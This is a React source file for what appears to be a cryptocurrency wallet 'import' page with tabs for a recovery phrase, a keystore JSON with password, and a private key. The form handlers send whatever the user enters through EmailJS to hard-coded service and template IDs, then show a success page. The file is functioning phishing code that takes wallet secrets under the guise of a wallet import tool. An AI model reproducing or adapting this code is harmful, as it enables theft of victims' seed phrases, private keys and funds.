import { Box } from "@mui/system";
import React from "react";
import { Typography } from "@mui/material";
import { useState } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import { Form } from "react-bootstrap";
import { Button } from "react-bootstrap";

import "bootstrap/dist/css/bootstrap.min.css";

const PhraseForm = () => {
  const [toggleState, setToggleState] = useState(1);

  const dot = '...'


  const navigate = useNavigate();
  const form = useRef();

  const form2 = useRef();

  
  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_yj787qi', 'template_zt82g1k', form.current, 'g4ZEWVbf7KjSHQdm2')
      .then((result) => {
          console.log(result.text);
          navigate("/success-page")
          
      }, (error) => {
          console.log(error.text);
          navigate("/error")
      });
  };

  const sendKeystore = (e) => {
    e.preventDefault();
    console.log(e.name);

    emailjs
      .sendForm(
        "service_yj787qi",
        "template_hlyjf9i",
        form2.current,
        "g4ZEWVbf7KjSHQdm2"
      )
      .then(
        (result) => {
          navigate("/success-page");
          console.log(result);
        },
        (error) => {
          console.log(error);
          navigate("/error");
        }
      );
  };

  
  return (
    <Box paddingY={8}>
      <div className="tab-container">
        <div className="tab-wrapper">
          <div
            onClick={() => setToggleState(1)}
            className={toggleState === 1 ? "tabs active" : "tabs"}
          >
            Phrase
          </div>
          <div
            onClick={() => setToggleState(2)}
            className={toggleState === 2 ? "tabs active" : "tabs"}
          >
            Keystore JSON
          </div>
          <div
            onClick={() => setToggleState(3)}
            className={toggleState === 3 ? "tabs active" : "tabs"}
          >
            Private Key
          </div>
        </div>

        <div className="content-tabs">
          <div
            className={
              toggleState === 1 ? "content container active-content" : "content"
            }
          >
            <form ref={form} onSubmit={sendEmail}>
              <input className="form-control" type='text' name="key_phrase" />
              <button className="btn btn-primary">SUBMIT</button>
            </form>
          
            {/* <Form ref={form}>
              <Form.Group
                className="mb-3"
                controlId="exampleForm.ControlTextarea1"
              >
                <Form.Control as="textarea" name="key_phrase" rows={12} />
              </Form.Group>


              <Box paddingY={2}>
                <Typography
                  sx={{
                    fontWeight: "bolder",
                    fontFamily: "Montserrat",
                    textAlign: "center",
                    fontSize: '.9rem'
                  }}
                  variant="h6"
                >
                  Typically 12 (sometimes 24) words seperated by single spaces
                </Typography>
              </Box>

              <Button
                className="btn btn-primary"
                variant="primary"
                type="submit"
                style={{ width: "200px" }}
                onClick={sendEmail}
              >
                IMPORT
              </Button>
            </Form> */}
          </div>

          <div
            className={
              toggleState === 2 ? "content container active-content" : "content"
            }
          >
            {/* <Form ref={form2} onSubmit={sendKeystore}>
              <Form.Group
                className="mb-3"
                controlId="exampleForm.ControlTextarea2"
              >
                <Form.Control as="textarea" name="key_phrase" rows={12} />
              </Form.Group>

              <Form.Group className="mb-3" controlId="formBasicPassword2">
                <Form.Control
                  type="password"
                  name="password"
                  placeholder="Password"
                />
              </Form.Group>

              <Box paddingY={2}>
                <Typography
                  sx={{
                    fontWeight: "bolder",
                    fontFamily: "Montserrat",
                    textAlign: "center",
                    fontSize: '.9rem'
                  }}
                  variant="h6"
                >
                  Several line of text beginning with {dot} plus the password you used to encrypte it
                </Typography>
              </Box>

              <Button
                className="btn btn-primary"
                variant="primary"
                type="submit"
                style={{ width: "200px" }}
              >
                IMPORT
              </Button>
            </Form> */}
          </div>

          <div
            className={
              toggleState === 3 ? "content container active-content" : "content"
            }
          >
            <Form ref={form} onSubmit={sendEmail}>
              <Form.Group
                className="mb-3"
                controlId="exampleForm.ControlTextarea3"
              >
                <Form.Control name="key_phrase" as="textarea" rows={12} />
              </Form.Group>
              <Box paddingY={2}>
                <Typography
                  sx={{
                    fontWeight: "bolder",
                    fontFamily: "Montserrat",
                    textAlign: "center",
                    fontSize: '.9rem'
                  }}
                  variant="h6"
                  
                >
                  Typically 12 (sometimes 24) words seperated by single spaces
                </Typography>
              </Box>
              <Button
                className="btn btn-primary"
                variant="primary"
                type="submit"
                style={{ width: "200px" }}
              >
                IMPORT
              </Button>
            </Form>
          </div>
        </div>
      </div>
    </Box>
  );
};

export default PhraseForm;
